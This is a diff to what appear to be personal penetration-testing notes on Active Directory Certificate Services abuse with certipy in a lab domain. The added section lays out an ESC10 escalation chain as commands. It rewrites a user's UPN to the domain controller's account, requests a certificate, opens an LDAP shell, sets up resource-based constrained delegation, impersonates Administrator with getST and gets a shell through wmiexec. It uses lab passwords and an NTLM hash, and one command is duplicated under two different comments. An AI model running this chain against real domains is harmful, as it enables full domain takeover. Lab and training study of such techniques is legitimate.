@@ -34,7 +34,7 @@ certipy req -u 'BlWasp@lab.local' -p 'Password123!' -dc-ip 10.129.205.199 -ca la
 %% certificate request with alternative SAN which creates a cert file name administrator.pfx which we can use later to authenticate as Administrator %%
 
 ```
-certipy auth -pfx administrator.pfx -username administrator -domain lab.local -dc-ip 10.129.205.199
+certipy auth -pfx administrator.pfx -username administrator -dc-ip 10.129.228.236  -dc-host LAB-DC.lab.local -target LAB-DC.lab.local -upn
 ```
 %% authenticate using administrator.pfx %%
 
@@ -194,3 +194,45 @@ certipy account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn 
 certipy auth -pfx administrator.pfx -domain lab.local
 ```
 %% authenticate as the administrator with the administrator.pfx %%
+
+ESC10 Abuse Requirements - Case 2
+To successfully carry out this privilege escalation tactic, specific prerequisites must be met:
+
+The CertificateMappingMethods registry key is set to 0x4, indicating no strong mapping.
+1. At least one template is enabled for client authentication (e.g., the built-in User template).
+2. We have at least GenericWrite rights for any account A, allowing us to compromise any account B that does not already have a UPN set (e.g., machine accounts or built-in Administrator accounts). This is important to avoid constraint violation errors on the UPN.
+
+```
+certipy account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn 'lab-dc$@lab.local'
+```
+%% update account to match DC machine name %%
+
+```
+certipy req -u 'user2@lab.local' -hashes 2b576acbe6bcfda7294d6bd18041b8fe -ca lab-LAB-DC-CA -template User
+```
+%% Request a certificate as user2 to get the domain controller certificate %%
+
+```
+certipy account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn user2@lab.local
+```
+%% revert changes of user 2 %%
+
+```
+certipy auth -pfx lab-dc.pfx -domain lab.local -dc-ip 10.129.205.199 -ldap-shell
+```
+%% create a new computer account and then use it to take over any other machine by configuring a Resource-Based Constrained Delegation. %%
+
+```
+certipy auth -pfx lab-dc.pfx -domain lab.local -dc-ip 10.129.205.199 -ldap-shell
+```
+%% Now, the computer account plaintext$ has the right to impersonate any account on LAB-DC$. We can use getST with the option impersonate to get a TGT as the Administrator %%
+
+```
+getST.py -spn cifs/LAB-DC.LAB.LOCAL -impersonate Administrator -dc-ip 10.129.205.199 lab.local/'plaintext$':plaintext123
+```
+%% Abusing RBCD to Impersonate the Administrator %%
+
+```
+KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass LAB-DC.LAB.LOCAL
+```
+%% connect using the Administrator TGT %%
